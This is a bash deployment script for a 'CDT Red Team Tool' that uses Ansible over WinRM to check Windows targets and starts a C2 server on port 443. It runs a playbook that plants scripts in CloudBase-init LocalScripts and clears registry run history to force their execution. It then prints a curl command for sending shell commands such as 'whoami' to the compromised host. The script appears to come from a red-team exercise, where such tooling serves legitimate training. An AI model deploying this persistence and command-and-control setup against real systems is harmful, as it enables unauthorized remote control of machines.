#!/bin/bash
# deploy.sh

# Master deployment script for the CDT Red Team Tool.
# Deploys to all targets defined in inventory.ini by default, or to a
# specific inventory file passed as an argument for single target deployment.
#
# Usage:
#   ./deploy.sh                    deploy to all targets in inventory.ini
#   ./deploy.sh inventory_ad.ini   deploy to a specific target inventory
#
# Prerequisites:
#   - WinRM must already be enabled on the target (run the one-liner on Windows first)
#   - setup_kali.sh must have been run at least once on this Kali machine
#   - cert.pem and key.pem must exist in the repo root

# ── Inventory selection ───────────────────────────────────────────────────────
# Uses the inventory file passed as the first argument if provided.
# Falls back to inventory.ini if no argument is given.
# This allows targeting a single machine like AD by passing its inventory file
# without modifying the main inventory.ini.
INVENTORY=${1:-inventory.ini}
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

# ── Test Ansible connectivity to target ──────────────────────────────────────
# Runs the Ansible win_ping module against all hosts in the selected inventory.
# win_ping verifies WinRM is reachable and credentials are correct.
# 2>&1 captures both stdout and stderr so we can check the output
# regardless of which stream Ansible writes to.
echo "[*] Testing connectivity to target(s)..."
PING_RESULT=$(ansible windows -i $INVENTORY -m win_ping 2>&1)

# If pong is not found in the output connectivity failed. Print the full
# Ansible error so the operator can diagnose the problem, then exit without
# attempting deployment against an unreachable target.
if echo "$PING_RESULT" | grep -q "pong"; then
    echo "[+] Connectivity confirmed - target is reachable"
else
    echo "[-] Connectivity failed. Output:"
    echo "$PING_RESULT"
    echo ""
    echo "Make sure WinRM is enabled on the target and credentials are correct."
    exit 1
fi

# ── Start C2 server in background ────────────────────────────────────────────
# Starts c2_server.py as a background process using & so the script
# continues without waiting for the server to exit. sudo is required
# because port 443 is a privileged port that requires root to bind.
# $! captures the process ID of the last background process so we can
# display it to the operator for reference if they need to kill it manually.
echo "[*] Starting C2 server in background..."
sudo python3 "$SCRIPT_DIR/c2_server.py" &
C2_PID=$!
echo "[+] C2 server started with PID $C2_PID"

# ── Run Ansible deployment playbook ──────────────────────────────────────────
# Executes deploy.yml against all hosts in the selected inventory file.
# Handles dropping scripts into CloudBase-init LocalScripts, clearing the
# registry run history, restarting CloudBase-init to trigger execution,
# and waiting for scripts to finish running.
echo "[*] Running deployment playbook..."
ansible-playbook deploy.yml -i $INVENTORY

echo ""
echo "[+] Deployment complete."
echo "[+] C2 server is running in background (PID $C2_PID)"
echo ""

# ── Automatically retrieve target hostname ────────────────────────────────────
# Runs hostname on the target and extracts the clean hostname string.
# grep -v filters out Ansible status lines and blank lines.
# tail -1 takes the last remaining line which is the actual hostname.
# tr -d removes trailing whitespace that would break the curl command below.
HOSTNAME=$(ansible windows -i $INVENTORY -m win_shell -a "hostname" 2>&1 | grep -v "CHANGED" | grep -v "^$" | tail -1 | tr -d '[:space:]')
echo "[+] Target hostname: $HOSTNAME"
echo ""

# ── Print ready-to-use curl command ──────────────────────────────────────────
# Prints a complete curl command with the hostname already filled in so the
# operator can immediately start issuing commands without manual construction.
# -sk skips certificate validation for the self-signed cert and suppresses
# progress output.
echo "To issue commands:"
echo "  curl -sk -X POST https://localhost/issue \\"
echo "    -H 'Content-Type: application/json' \\"
echo "    -d '{\"id\": \"$HOSTNAME\", \"cmd\": \"whoami\"}'"
echo ""
echo "To view C2 output, check your terminal or run:"
echo "  tail -f /tmp/c2.log"